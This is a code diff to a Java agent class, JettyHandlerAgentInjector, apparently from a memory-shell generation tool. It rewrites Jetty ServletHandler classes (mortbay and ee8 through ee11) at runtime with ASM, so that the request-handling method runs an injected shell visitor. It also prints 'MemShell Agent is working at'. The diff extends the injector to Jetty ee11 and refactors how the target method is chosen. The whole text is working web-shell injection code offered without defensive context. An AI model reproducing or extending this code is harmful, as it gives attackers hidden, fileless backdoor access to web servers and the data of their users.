@@ -21,9 +21,9 @@ public class JettyHandlerAgentInjector implements ClassFileTransformer {
             "org/eclipse/jetty/ee8/servlet/ServletHandler",
             "org/eclipse/jetty/ee9/servlet/ServletHandler",
             "org/eclipse/jetty/ee10/servlet/ServletHandler$Chain",
+            "org/eclipse/jetty/ee11/servlet/ServletHandler$Chain",
             "org/mortbay/jetty/servlet/ServletHandler"
     );
-    private static String targetMethodName = "doHandle";
 
     public static String getClassName() {
         return "{{advisorName}}";
@@ -48,14 +48,7 @@ public class JettyHandlerAgentInjector implements ClassFileTransformer {
             String name = allLoadedClass.getName();
             for (String targetClass : TARGET_CLASSES) {
                 if (targetClass.replace("/", ".").equals(name)) {
-                    if (name.contains("mortbay")) {
-                        targetMethodName = "handle";
-                    }
-                    if (name.contains("ee10")) {
-                        targetMethodName = "doFilter";
-                    }
                     inst.retransformClasses(allLoadedClass);
-                    System.out.println("MemShell Agent is working at " + name + "." + targetMethodName);
                 }
             }
         }
@@ -66,10 +59,11 @@ public class JettyHandlerAgentInjector implements ClassFileTransformer {
     public byte[] transform(final ClassLoader loader, String className, Class<?> classBeingRedefined,
                             ProtectionDomain protectionDomain, byte[] bytes) {
         if (TARGET_CLASSES.contains(className)) {
+            String targetMethodName = "";
             if (className.contains("mortbay")) {
                 targetMethodName = "handle";
             }
-            if (className.contains("ee10")) {
+            if (className.contains("ee10") || className.contains("ee11")) {
                 targetMethodName = "doFilter";
             }
             defineTargetClass(loader);
@@ -81,8 +75,9 @@ public class JettyHandlerAgentInjector implements ClassFileTransformer {
                         return loader;
                     }
                 };
-                ClassVisitor cv = getClassVisitor(cw);
+                ClassVisitor cv = getClassVisitor(cw, targetMethodName);
                 cr.accept(cv, ClassReader.EXPAND_FRAMES);
+                System.out.println("MemShell Agent is working at " + className.replace("/", ".") + "." + targetMethodName);
                 return cw.toByteArray();
             } catch (Exception e) {
                 e.printStackTrace();
@@ -92,19 +87,15 @@ public class JettyHandlerAgentInjector implements ClassFileTransformer {
     }
 
     @SuppressWarnings("all")
-    public static ClassVisitor getClassVisitor(ClassVisitor cv) {
+    public static ClassVisitor getClassVisitor(ClassVisitor cv, String targetMethodName) {
         return new ClassVisitor(Opcodes.ASM9, cv) {
             @Override
             public MethodVisitor visitMethod(int access, String name, String descriptor,
                                              String signature, String[] exceptions) {
                 MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                 if (targetMethodName.equals(name)) {
-                    try {
-                        Type[] argumentTypes = Type.getArgumentTypes(descriptor);
-                        return new AgentShellMethodVisitor(mv, argumentTypes, getClassName());
-                    } catch (Exception e) {
-                        e.printStackTrace();
-                    }
+                    Type[] argumentTypes = Type.getArgumentTypes(descriptor);
+                    return new AgentShellMethodVisitor(mv, argumentTypes, getClassName());
                 }
                 return mv;
             }
